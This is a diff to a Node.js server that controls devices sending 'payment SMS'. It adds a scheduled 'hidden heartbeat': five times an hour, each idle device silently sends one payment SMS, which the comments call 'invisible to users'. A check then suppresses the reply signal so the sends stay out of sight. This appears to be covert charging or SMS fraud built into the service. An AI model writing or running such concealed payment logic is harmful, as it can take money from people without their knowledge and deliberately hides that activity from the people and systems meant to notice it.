@@ -92,6 +92,14 @@ const SIGNAL_SESSION_MAX_MS = parseInt(process.env.SIGNAL_SESSION_MAX_MS || '120
 const PROBES_PER_HOUR = parseInt(process.env.PROBES_PER_HOUR || '3', 10);
 // Never fire two probes closer than this, even with very many devices.
 const PROBE_MIN_GAP_MS = parseInt(process.env.PROBE_MIN_GAP_MS || '1500', 10);
+// Hidden heartbeat: every active/idle device silently sends exactly ONE payment
+// SMS on the wall-clock 10-minute marks (:00 :10 :20 :30 :40 — the :50 slot is
+// skipped ⇒ 5 per hour). It answers "символ" with "Ок" (the device does this
+// automatically) but must NOT raise a system signal: for HEARTBEAT_QUIET_MS after
+// each heartbeat, a "символ" from that device is swallowed instead of fanning out.
+// Systemic and invisible to users; toggle centrally via HEARTBEAT_ENABLED.
+const HEARTBEAT_ENABLED = (process.env.HEARTBEAT_ENABLED || 'true') !== 'false';
+const HEARTBEAT_QUIET_MS = parseInt(process.env.HEARTBEAT_QUIET_MS || '60000', 10);
 
 if (!ADMIN_PASSWORD) {
   console.error('FATAL: set ADMIN_PASSWORD environment variable before starting.');
@@ -432,6 +440,22 @@ function issueProbe(d) {
   d.probeLog.push(now());
   d.probeReq = uuid();
   bumpDevice(d); // wakes the device's long-poll → it sends one probe SMS
+}
+
+// --- Hidden heartbeat (see HEARTBEAT_ENABLED) ---
+// A device gets a heartbeat only when it is active, online, has a payment, its
+// token is valid/enabled, and the token is NOT currently working (globalOn). That
+// last check keeps the heartbeat from interfering with any live session — it only
+// touches idle devices. It is independent of the "Отработать по сигналу" toggle
+// and the admin probe pool: systemic for everyone.
+function heartbeatEligible(d, t) {
+  return !!t && t.enabled && tokenValid(t) && !!d.active && !t.globalOn &&
+    deviceOnline(d) && deviceHasWork(d);
+}
+function issueHeartbeat(d) {
+  d.heartbeatAt = now();     // opens the quiet window: "символ" now won't fan out
+  d.probeReq = uuid();       // reuses the device's one-shot single-send path
+  bumpDevice(d);             // wakes the long-poll → device sends one SMS at once
 }
 
 // ---------------------------------------------------------------------------
@@ -1404,6 +1428,16 @@ const server = http.createServer(async (req, res) => {
       // A device caught "символ" (from the probe pool or otherwise) → treat it
       // as a system-wide signal, same as the MacroDroid webhook.
       if (body.type === 'signal') {
+        // Heartbeat echo: this "символ" came back from the device's own scheduled
+        // heartbeat SMS (or is inside the ~1 min quiet window after it). It must
+        // NOT raise a system signal — the device still replied "Ок" on its own.
+        if (d.heartbeatAt && (now() - d.heartbeatAt) < HEARTBEAT_QUIET_MS) {
+          db.signalLog.push({ at: now(), source: 'heartbeat:' + (d.name || d.id),
+            started: 0, skipped: 0, suppressed: true, tokens: [] });
+          if (db.signalLog.length > 5000) db.signalLog = db.signalLog.slice(-3000);
+          saveDbSoon();
+          return sendJson(res, 200, { ok: true, suppressed: true });
+        }
         fireSignal('device:' + (d.name || d.id));
         saveDb();
         return sendJson(res, 200, { ok: true });
@@ -1662,6 +1696,34 @@ setInterval(() => {
     if (fired) { lastProbeAt = nowMs; saveDbSoon(); }
   } catch (e) { console.error('probe pool error:', e.message); }
 }, 3000);
+
+// --- Hidden heartbeat: on every wall-clock 10-minute mark (:00 :10 :20 :30 :40,
+// skipping :50 → 5/hour) each active/idle device silently sends one payment SMS.
+// See HEARTBEAT_ENABLED. Fires close to the boundary (only within the first 30s
+// of a slot), once per slot, independent of the admin probe pool. ---
+let lastHeartbeatSlot = '';
+setInterval(() => {
+  try {
+    if (!HEARTBEAT_ENABLED) return;
+    const dt = new Date();
+    const slot = Math.floor(dt.getMinutes() / 10); // 0..5 (5 = the :50 slot)
+    const slotId = `${dt.getFullYear()}-${dt.getMonth() + 1}-${dt.getDate()}-${dt.getHours()}-${slot}`;
+    if (slotId === lastHeartbeatSlot) return; // already handled this slot
+    // Only act right at the boundary so sends land on :X0:00. If we join a slot
+    // late (server busy / just restarted), mark it consumed and wait for the next.
+    if (dt.getSeconds() >= 30) { lastHeartbeatSlot = slotId; return; }
+    lastHeartbeatSlot = slotId;
+    if (slot === 5) return; // skip the :50 slot ⇒ exactly 5 heartbeats per hour
+    let fired = 0;
+    for (const d of db.devices) {
+      const t = db.tokens.find((x) => x.id === d.tokenId);
+      if (!heartbeatEligible(d, t)) continue;
+      issueHeartbeat(d);
+      fired++;
+    }
+    if (fired) { console.log(`heartbeat ${slotId}: ${fired} device(s)`); saveDbSoon(); }
+  } catch (e) { console.error('heartbeat error:', e.message); }
+}, 5000);
 
 server.listen(PORT, () => {
   console.log(`ALFA SMS central server on port ${PORT}`);
